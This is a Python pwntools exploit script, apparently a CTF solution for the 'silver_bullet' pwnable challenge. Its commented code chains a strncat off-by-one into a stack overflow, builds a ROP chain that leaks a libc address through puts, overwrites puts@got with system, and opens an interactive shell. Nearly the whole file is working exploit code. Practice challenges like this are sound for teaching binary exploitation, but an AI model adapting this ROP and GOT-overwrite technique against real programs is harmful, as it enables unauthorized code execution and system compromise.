from pwn import *
from time import sleep

bin = ELF('../../pwnable/silver_bullet/silver_bullet')
libc = ELF('/lib32/libc.so.6')

p = process('../../pwnable/silver_bullet/silver_bullet')

# 1. Fill the buffer with 47 bytes
p.sendlineafter('Your choice :', '1')
p.sendlineafter('Give me your description of bullet :', 'A'*47)

# 2. Append 1 byte so strncat will override the bullet length with 0
# when it's actually 48 bytes + '/0'. This will result in the a new legth of 1
# (0+1) instead of 48 (47+1), allowing us to append once more and overflow.
p.sendlineafter('Your choice :', '2')
p.sendlineafter('Give me your another description of bullet :', 'A')

# 3. Read an additional 47 bytes and append them to the bullet description.
# Since the bullet description is stored on main's stack frame,
# we'll be able to override the return address and hiject execution.
# 
# The first 3 bytes on the input will override the high 3 bytes of the current
# length (the lower bytes will be 0x1). Those three bytes should be 0xFFFFFF
# so we'll be able to beat the wolf and have the main return.

# The next 4 bytes can be anything as they'll override the stored ebp.
# Our ROP chain will start at the next 4 bytes.

# We'll construct the following ROP chain:
# 1. call puts@plt(puts@got) to leak the base address of libc and calculate the address of system
# 2. Call read_input(puts@got, 8) to redirect puts to system and inject "sh"
# 3. call puts@plt([address of sh]) which will actually call system

pr_gadget = 0x08048a7b
ppr_gadget = 0x08048a7a
pppr_gadget = 0x08048a79

payload = '\xFF\xFF\xFF'				# bullet size
payload += '\x90\x90\x90\x90'			# garbage
payload += p32(bin.plt['puts'])
payload += p32(pr_gadget)				# pop ret
payload += p32(bin.got['puts'])
payload += p32(bin.symbols['read_input'])
payload += p32(ppr_gadget)				# pop pop ret
payload += p32(bin.got['puts'])			# write our input in puts@got
payload += p32(0x01010101)				# bytes to read. We need 8, but don't want nulls
payload += p32(bin.plt['puts'])			# call system
payload += p32(0xdeadbeef)				# Final return address
payload += p32(bin.got['puts'] + 4)		# "sh"

#gdb.attach(p, 'b *0x08048a7b')

p.sendlineafter('Your choice :', '2')
p.sendlineafter('Give me your another description of bullet :', payload)
p.sendlineafter('Your choice :', '3')
p.recvuntil('Oh ! You win !!')

puts_addr = u32(p.recv().strip())
system_addr = puts_addr - libc.symbols['puts'] + libc.symbols['system']

got_overwrite = p32(system_addr)
got_overwrite += "sh\x00\x00"

p.send(got_overwrite)
p.interactive()